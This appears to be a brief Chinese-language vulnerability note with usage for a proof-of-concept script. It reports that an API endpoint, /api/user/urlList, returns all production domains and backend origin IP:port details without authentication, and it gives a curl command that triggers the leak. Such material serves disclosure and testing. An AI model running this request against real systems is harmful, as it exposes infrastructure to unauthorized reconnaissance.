## 描述

POST /api/user/urlList 不带 token，body 仅需 type=0/1/2，即返回同平台全部生产域名；响应 health_msg 字段把后端回源地址（IP:端口）与健康检查实现（疑似 curl/Go 客户端）原样回显给前端。

## 用法

```
python3 poc_url_list.py --base http://example.com
或手工：curl -X POST "http://example.com/api/user/urlList" -H "Content-Type: application/x-www-form-urlencoded" -d "type=0"
```
